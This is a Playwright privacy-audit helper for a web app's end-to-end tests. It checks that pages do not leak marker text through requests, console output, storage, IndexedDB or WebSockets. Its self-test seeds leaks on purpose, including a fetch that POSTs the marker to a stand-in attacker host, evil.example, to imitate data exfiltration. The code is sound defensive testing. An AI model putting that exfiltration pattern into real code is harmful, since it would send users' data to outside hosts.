// One privacy audit for the demo rehearsal (Phase 6, PD-12). It observes what the browser pages actually did:
// every attempted request (the runner aborts non-local ones, but Playwright still reports the attempt),
// WebSockets, console lines, page errors, storage, IndexedDB and, for pages that opt in, the visible text.
//
//   const audit = createPrivacyAudit({ baseUrl, rpcUrl, markers, extraAllowedOrigins });
//   await audit.track(page, "seller");                    // requests, console, errors, sockets, storage
//   await audit.track(page, "buyer", { bodyText: true }); // also scan the page text (PD-13)
//   await audit.snapshotBody(page, "buyer on /buy");      // remember the page text at this moment
//   const { requests, origins } = await audit.assertClean(); // throws one Error listing every finding
//
// It lives under e2e/helpers/, so the runner (which only runs top-level *.e2e.mjs) never runs it as a script.
// Self-test (proves each of the 12 checks fires on a seeded leak and stays quiet on a clean page):
//   node web/e2e/helpers/privacy-audit.mjs --self-test
import http from "node:http";

// Measured on a production build in headless Chrome (06-RESEARCH, Pattern 2): besides the app origin, the
// wallet libraries attempt exactly these two calls. The runner aborts both, so no data actually leaves.
const TOLERATED = [
  { origin: "https://pulse.walletconnect.org", methods: ["POST"] }, // RainbowKit and WalletConnect telemetry
  { origin: "https://api.web3modal.org", methods: ["GET"] }, // Reown project-config fetch
];
// Keys the wallet libraries and the role picker own (same list as the Phase 4 inline audit).
const STORAGE_KEY_OK = /^(opaquely:role:|wagmi|rk-|@appkit|base-acc-sdk|WALLETCONNECT|wc@)/i;
// Databases the wallet libraries own. "keyval-store" (the tesseract model cache) must never appear.
const IDB_ALLOWED = ["WALLET_CONNECT_V2_INDEXED_DB", "base-acc-sdk"];
// PD-14: WebSocket hosts tolerated beyond the app and RPC hosts. Empty until a real run shows one from the
// wallet libraries; add exactly that host here with a comment and record it in the plan SUMMARY.
const TOLERATED_WEBSOCKET_HOSTS = [];

export const AUDIT_TAGS = [
  "network-origin",
  "post-target",
  "marker-request",
  "marker-console",
  "marker-pageerror",
  "marker-body",
  "storage-key",
  "marker-storage",
  "idb-name",
  "marker-idb",
  "failed-request",
  "websocket-host",
];

const short = (s, n = 160) => (s.length > n ? s.slice(0, n) + "..." : s);

/** Origin of a request URL: blob: resolves to its inner origin, data: is not network traffic. */
function originOf(url) {
  if (url.startsWith("data:")) return null;
  const inner = url.startsWith("blob:") ? url.slice(5) : url;
  try {
    return new URL(inner).origin;
  } catch {
    return url;
  }
}

export function createPrivacyAudit({ baseUrl, rpcUrl, markers, extraAllowedOrigins = [] }) {
  const appOrigin = new URL(baseUrl).origin;
  const rpcOrigin = new URL(rpcUrl).origin;
  const appHost = new URL(baseUrl).host;
  const rpcHost = new URL(rpcUrl).host;
  const requests = []; // { label, url, method, origin, post }
  const failures = []; // { label, url, error }
  const consoleLines = []; // { label, text }
  const pageErrors = []; // { label, text }
  const sockets = []; // { label, url }
  const snapshots = []; // { label, text }
  const pages = []; // { page, label, bodyText }

  const hit = (text) => markers.filter((m) => text.includes(m));

  // Async: it installs a WebSocket recorder before the first navigation, so `await` it right after the page is
  // created. Playwright's own "websocket" event only fires for sockets that reached a handshake, so a socket to
  // a refused or unresolvable host would go unseen; the in-page wrapper records every constructor call.
  // (Sockets opened from a worker are not covered; the request, storage and IndexedDB checks still apply.)
  async function track(page, label, { bodyText = false } = {}) {
    pages.push({ page, label, bodyText });
    await page.exposeFunction("__opaquelyAuditSocket", (url) => {
      sockets.push({ label, url });
    });
    await page.addInitScript(() => {
      const Native = window.WebSocket;
      window.WebSocket = new Proxy(Native, {
        construct(target, args) {
          try {
            window.__opaquelyAuditSocket(String(args[0]));
          } catch {
            /* recording must never break the page */
          }
          return Reflect.construct(target, args);
        },
      });
    });
    page.on("request", (r) => {
      requests.push({ label, url: r.url(), method: r.method(), origin: originOf(r.url()), post: r.postData() ?? "" });
    });
    page.on("requestfailed", (r) => failures.push({ label, url: r.url(), error: r.failure()?.errorText ?? "" }));
    page.on("console", (m) => consoleLines.push({ label, text: m.text() }));
    page.on("pageerror", (e) => pageErrors.push({ label, text: e.message }));
    page.on("websocket", (ws) => sockets.push({ label, url: ws.url() }));
    return page;
  }

  async function snapshotBody(page, label) {
    snapshots.push({ label, text: await page.evaluate(() => document.body.innerText) });
  }

  async function scanStorage(page) {
    return page
      .evaluate(() => {
        try {
          const out = [];
          for (const store of [localStorage, sessionStorage]) {
            for (const key of Object.keys(store)) out.push([key, store.getItem(key) ?? ""]);
          }
          return out;
        } catch {
          return []; // about:blank and similar pages have no storage
        }
      })
      .catch(() => []);
  }

  // Tested in headless Chrome in 06-RESEARCH: opens every database, reads every store, searches the JSON.
  // ArrayBuffer and Blob values stringify to {}, so binary payloads are not searched; the name allow-list is
  // the primary control for those.
  async function scanIndexedDb(page) {
    return page
      .evaluate(async (ms) => {
        const hits = [];
        let dbs = [];
        try {
          dbs = (await indexedDB.databases()) ?? [];
        } catch {
          return { names: [], hits };
        }
        for (const { name } of dbs) {
          const db = await new Promise((res, rej) => {
            const r = indexedDB.open(name);
            r.onsuccess = () => res(r.result);
            r.onerror = () => rej(r.error);
          });
          for (const store of Array.from(db.objectStoreNames)) {
            const rows = await new Promise((res, rej) => {
              const r = db.transaction(store).objectStore(store).getAll();
              r.onsuccess = () => res(r.result);
              r.onerror = () => rej(r.error);
            });
            let text;
            try {
              text = JSON.stringify(rows);
            } catch {
              text = String(rows);
            }
            for (const m of ms) if (text.includes(m)) hits.push(name + "/" + store + ":" + m);
          }
          db.close();
        }
        return { names: dbs.map((d) => d.name), hits };
      }, markers)
      .catch(() => ({ names: [], hits: [] }));
  }

  async function assertClean() {
    const findings = [];
    const add = (tag, detail) => {
      const line = `[${tag}] ${short(detail)}`;
      if (!findings.includes(line)) findings.push(line);
    };

    // 1 and 2: where requests went, and which POSTs.
    for (const r of requests) {
      if (r.origin === null) continue;
      const tolerated = TOLERATED.find((t) => t.origin === r.origin);
      const extra = extraAllowedOrigins.includes(r.origin);
      const ok =
        r.origin === appOrigin ||
        (r.origin === rpcOrigin && (r.method === "POST" || r.method === "OPTIONS")) ||
        (tolerated && tolerated.methods.includes(r.method)) ||
        extra;
      if (!ok) add("network-origin", `${r.label}: ${r.method} ${r.url}`);
      if (r.method === "POST" && r.origin !== rpcOrigin && r.origin !== "https://pulse.walletconnect.org" && !extra) {
        add("post-target", `${r.label}: POST ${r.url}`);
      }
    }
    // 3: markers in any request URL or body.
    for (const r of requests) for (const m of hit(r.url + " " + r.post)) add("marker-request", `${r.label}: "${m}" in ${r.method} ${r.url}`);
    // 4 and 5: markers in console lines and page errors.
    for (const c of consoleLines) for (const m of hit(c.text)) add("marker-console", `${c.label}: "${m}"`);
    for (const e of pageErrors) for (const m of hit(e.text)) add("marker-pageerror", `${e.label}: "${m}"`);
    // 6: markers in the page text of pages that opted in, now and at every snapshot.
    for (const s of snapshots) for (const m of hit(s.text)) add("marker-body", `${s.label}: "${m}" in a snapshot`);
    for (const p of pages) {
      if (!p.bodyText || p.page.isClosed()) continue;
      const text = await p.page.evaluate(() => document.body.innerText).catch(() => "");
      for (const m of hit(text)) add("marker-body", `${p.label}: "${m}" in the page text`);
    }
    // 7 to 10: storage and IndexedDB of every page still open.
    for (const p of pages) {
      if (p.page.isClosed()) continue;
      for (const [key, value] of await scanStorage(p.page)) {
        if (!STORAGE_KEY_OK.test(key)) add("storage-key", `${p.label}: ${key}`);
        for (const m of hit(value)) add("marker-storage", `${p.label}: "${m}" in storage key ${key}`);
      }
      const idb = await scanIndexedDb(p.page);
      for (const name of idb.names) if (!IDB_ALLOWED.includes(name)) add("idb-name", `${p.label}: ${name}`);
      for (const h of idb.hits) add("marker-idb", `${p.label}: ${h}`);
    }
    // 11: failed requests that matter. Third-party failures are the runner's own aborts (Pitfall 4).
    for (const f of failures) {
      const inAssets = /\/(tesseract|samples)\//.test(f.url);
      const onApp = originOf(f.url) === appOrigin;
      if (inAssets || (onApp && f.error !== "net::ERR_ABORTED")) add("failed-request", `${f.label}: ${f.url} (${f.error})`);
    }
    // 12: WebSockets to anywhere but the app or the node.
    for (const s of sockets) {
      let host = s.url;
      try {
        host = new URL(s.url).host;
      } catch {
        /* keep the raw string */
      }
      if (host !== appHost && host !== rpcHost && !TOLERATED_WEBSOCKET_HOSTS.includes(host)) add("websocket-host", `${s.label}: ${s.url}`);
    }

    if (findings.length > 0) throw new Error("privacy audit: " + findings.join(" | "));
    return { requests: requests.length, origins: [...new Set(requests.map((r) => r.origin).filter(Boolean))].sort() };
  }

  return { track, snapshotBody, assertClean };
}

// ---------------------------------------------------------------------------------------------------------
// Self-test
// ---------------------------------------------------------------------------------------------------------
async function selfTest() {
  const PORT = 3189;
  const baseUrl = `http://127.0.0.1:${PORT}`;
  const rpcUrl = "http://127.0.0.1:8545";
  const server = http.createServer((req, res) => {
    res.setHeader("content-type", "text/html");
    res.end("<!doctype html><title>audit</title><body><p>clean page</p></body>");
  });
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(PORT, "127.0.0.1", resolve);
  });
  const { chromium } = await import("playwright-core");
  let browser;
  try {
    browser = await chromium.launch({
      channel: "chrome",
      headless: true,
      args: ["--use-gl=angle", "--use-angle=swiftshader", "--enable-unsafe-swiftshader"],
    });
    const isLocal = (url) => {
      try {
        const h = new URL(url).hostname;
        return h === "127.0.0.1" || h === "localhost";
      } catch {
        return false;
      }
    };
    const newContext = async () => {
      const context = await browser.newContext();
      // Same rule as the e2e runner: nothing but the local server may be reached.
      await context.route("**/*", (route) => {
        const url = route.request().url();
        if (url.includes("/tesseract/")) return route.abort();
        return isLocal(url) ? route.continue() : route.abort();
      });
      return context;
    };

    // (a) Clean: wallet-library-shaped traffic only. Must not throw.
    {
      const context = await newContext();
      const audit = createPrivacyAudit({ baseUrl, rpcUrl, markers: ["SHREE GANESH"] });
      const page = await context.newPage();
      await audit.track(page, "clean", { bodyText: true });
      await page.goto(baseUrl + "/");
      await page.evaluate(() => {
        localStorage.setItem("wagmi.store", "{}");
        fetch("https://api.web3modal.org/x").catch(() => {});
      });
      await page.waitForTimeout(500);
      try {
        await audit.assertClean();
      } catch (err) {
        throw new Error("the clean page was flagged: " + (err instanceof Error ? err.message : String(err)));
      }
      await context.close();
    }

    // (b) Dirty: one seeded leak of each kind. Must throw, naming all 12 tags.
    {
      const context = await newContext();
      const audit = createPrivacyAudit({ baseUrl, rpcUrl, markers: ["SHREE GANESH"] });
      const page = await context.newPage();
      await audit.track(page, "dirty", { bodyText: true });
      await page.goto(baseUrl + "/");
      await page.evaluate(async () => {
        const M = "SHREE GANESH";
        fetch("https://evil.example/c", { method: "POST", body: M }).catch(() => {}); // network-origin, post-target, marker-request
        fetch("https://api.web3modal.org/x", { method: "POST", body: "x" }).catch(() => {}); // a tolerated host, the wrong method
        console.log(M); // marker-console
        setTimeout(() => {
          throw new Error(M);
        }, 0); // marker-pageerror
        document.body.textContent = M; // marker-body
        localStorage.setItem("draft-bill", "x"); // storage-key
        localStorage.setItem("wagmi.store", M); // marker-storage
        await new Promise((res, rej) => {
          const r = indexedDB.open("keyval-store");
          r.onupgradeneeded = () => r.result.createObjectStore("s");
          r.onsuccess = () => {
            const tx = r.result.transaction("s", "readwrite");
            tx.objectStore("s").put(M, "k");
            tx.oncomplete = () => {
              r.result.close();
              res();
            };
            tx.onerror = () => rej(tx.error);
          };
          r.onerror = () => rej(r.error);
        }); // idb-name, marker-idb
        fetch("/tesseract/missing.js").catch(() => {}); // failed-request (the context aborts it)
        new WebSocket("ws://127.0.0.2:9/x"); // websocket-host
      });
      await page.waitForTimeout(1000);
      let message = "";
      try {
        await audit.assertClean();
      } catch (err) {
        message = err instanceof Error ? err.message : String(err);
      }
      if (!message) throw new Error("the dirty page was not flagged");
      const missing = AUDIT_TAGS.filter((t) => !message.includes(`[${t}]`));
      if (missing.length > 0) throw new Error("these checks never fired: " + missing.join(", "));
      await context.close();
    }
    console.log(`AUDIT SELF-TEST OK tags=${AUDIT_TAGS.length}`);
  } finally {
    if (browser) await browser.close().catch(() => {});
    await new Promise((resolve) => server.close(resolve));
  }
}

if (process.argv.includes("--self-test")) {
  selfTest().then(
    () => process.exit(0),
    (err) => {
      console.log("AUDIT SELF-TEST FAILED " + (err instanceof Error ? err.message : String(err)));
      process.exit(1);
    },
  );
}
